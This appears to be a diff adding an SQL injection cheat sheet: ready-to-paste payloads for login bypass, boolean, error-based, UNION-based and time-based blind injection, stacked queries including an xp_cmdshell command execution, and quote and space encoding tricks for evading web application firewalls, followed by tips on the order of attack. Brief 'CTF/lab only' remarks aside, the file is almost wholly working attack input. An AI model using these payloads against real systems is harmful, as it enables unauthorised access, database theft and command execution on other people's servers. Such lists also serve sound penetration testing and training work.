@@ -1,0 +1,65 @@
+--- AUTH BYPASS (try first)
+' OR '1'='1'--
+' OR 1=1-- -
+' OR 'a'='a'#
+" OR "1"="1
+admin' --
+' OR '1'='1'/*
+
+--- BOOLEAN (fast, low-noise)
+' OR 1=1--
+' AND 1=2--
+' OR 'x'='x'--
+' AND (SELECT 1)=1--
+' OR SUBSTRING((SELECT database()),1,1)='a'--
+
+--- ERROR-BASED (MySQL favorites)
+' AND extractvalue(1,concat(0x3a,(SELECT database()),0x3a))--
+' AND updatexml(1,concat(0x3a,(SELECT user()),0x3a),1)--
+
+--- UNION-BASED (find cols then extract)
+' ORDER BY 1--
+' ORDER BY 2--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT 1,(SELECT database()),3,4--
+
+--- TIME-BASED / BLIND (last resort)
+' OR IF(1=1,SLEEP(5),0)--
+' OR IF(SUBSTR((SELECT database()),1,1)='a',SLEEP(5),0)--
+'; WAITFOR DELAY '0:0:5'-- (MSSQL)
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) END)-- (Postgres)
+
+--- STACKED QUERIES (MSSQL ; CTF-use only)
+'; WAITFOR DELAY '0:0:5'--
+'; EXEC xp_cmdshell('whoami')--
+
+--- DB-SPECIFIC SHORTCUTS
+MySQL: extractvalue(...), updatexml(...), CONCAT(0x3a,(SELECT ...),0x3a)
+MSSQL: CHAR(65)+CHAR(66)+..., DB_NAME(), @@version, WAITFOR DELAY
+Postgres: pg_sleep(5), version()
+Oracle: use DBMS/UTL timing tricks (lab only)
+
+--- ENCODING / BYPASS TACTICS
+'//OR//1=1--
+%27%20OR%201%3D1-- (URL-encoded)
+UNION//ALL//SELECT
+randomCase UnIoN aLl SeLeCt
+
+--- QUICK UNION TEMPLATE (edit column count)
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT 1,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),3,4--
+
+--- NOTES
+
+Keep hidden fields (e.g., __VIEWSTATE, CSRF tokens) intact for ASP.NET forms.
+
+Try payloads in both username and password fields.
+
+Start with auth-bypass → boolean → error/UNION → time-based.
+
+Use tamper/encoding when filters/WAF block quotes or spaces.
+
+Only use destructive payloads (DROP, WRITE) in CTF/lab environments.
+
+--- end (paste into Notepad)
